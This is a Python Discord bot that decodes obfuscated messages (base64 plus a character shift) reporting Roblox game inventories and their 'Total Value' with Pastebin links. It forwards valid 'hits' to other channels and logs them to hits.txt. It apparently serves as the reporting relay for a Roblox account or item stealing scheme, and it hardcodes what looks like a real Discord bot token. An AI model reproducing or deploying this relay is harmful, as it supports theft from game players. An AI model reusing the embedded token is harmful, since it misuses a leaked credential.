import discord
import re
import base64

TOKEN = "MTI2NDk3NjEwNTY3NzM4OTg5NA.GVcQRm.NDWo0NXc5K5Dy0vOogdi5cR1K2Yf6TqsatvnaY"  # Replace with your Discord bot token

intents = discord.Intents.default()
intents.message_content = True  # Enables the bot to read message content
intents.webhooks = True

client = discord.Client(intents=intents)

SOURCE_CHANNEL_ID = 1319759650903560315  # Replace with your source channel ID
TARGET_CHANNEL_IDS = [1319759777730920539]  # Replace with your target channel IDs

def shift(input_string, shift):
    deobfuscated_string = ""
    for char in input_string:
        deobfuscated_char = chr(ord(char) - shift)
        deobfuscated_string += deobfuscated_char
    return deobfuscated_string

def base64_decode(encoded_data):
    byte_data = base64.b64decode(encoded_data)
    return byte_data.decode('utf-8')

def verify_string(s):
    s = base64_decode(s)
    s = shift(s, 2)
    newmessage = s.splitlines()
    newmessage.remove(newmessage[len(newmessage)-1])
    s = ""
    for x in range(len(newmessage)):
        s = s + newmessage[x] + "\n"
    
    # Define regex patterns to match
    pattern = r"^Adopt Me\nTotal Value: (-?\d+(\.\d+)?)\nInventory List: (https?://pastebin\.com/[^\s]+|Error)$"
    pattern2 = r"^Murder Mystery 2\nTotal Value: (-?\d+(\.\d+)?)\nInventory List: (https?://pastebin\.com/[^\s]+|Error)$"
    pattern3 = r"^Blade Ball\nTotal Value: (-?\d+(\.\d+)?)\nInventory List: (https?://pastebin\.com/[^\s]+|Error)$"
    
    match3 = re.fullmatch(pattern3, s.strip())
    match2 = re.fullmatch(pattern, s.strip())
    match = re.fullmatch(pattern2, s.strip())

    # Check if any of the patterns match
    if match3 is not None:
        return match3 is not None
    if match2 is not None:
        return match2 is not None
    if match is not None:
        return match is not None
    return False

def getnewmessage(s):
    s = base64_decode(s)
    s = shift(s, 2)
    newmessage = s.splitlines()
    newmessage.remove(newmessage[len(newmessage)-1])
    s = ""
    for x in range(len(newmessage)):
        s = s + newmessage[x] + "\n"
    return s

@client.event
async def on_ready():
    print(f'Logged in as {client.user}')

@client.event
async def on_message(message):
    # Ignore messages from the bot and webhook messages
    if message.author.bot and not message.webhook_id:
        return

    # If the message is from the source channel
    if message.channel.id == SOURCE_CHANNEL_ID:
        should_forward = False  # Flag to determine if the message should be forwarded

        # If the message contains mentions, do not forward it
        if len(message.mentions) > 0:
            return

        # If the message has embeds, do not forward it
        embedsamount = 0
        for embed in message.embeds:
            embedsamount += 1
        if embedsamount > 0:
            return

        # Check if the message content is valid
        if verify_string(message.content):
            should_forward = True
        
        # If the message should be forwarded, send it to the target channels
        if should_forward:
            for target_channel_id in TARGET_CHANNEL_IDS:
                target_channel = client.get_channel(target_channel_id)

                if target_channel is not None:
                    try:
                        # Send the modified message content to the target channel
                        if message.content:
                            await target_channel.send(getnewmessage(message.content))
                            print(f"sended {target_channel_id}")

                            # Write the forwarded message to hits.txt
                            lines_to_add = [f"{getnewmessage(message.content)}\n"]
                            with open('hits.txt', 'a') as file:
                                file.writelines(lines_to_add)

                    except Exception as e:
                        print(f"ошибка {target_channel_id}: {e}")
        else:
            print("fake hit")

# Run the bot with the provided token
client.run(TOKEN)
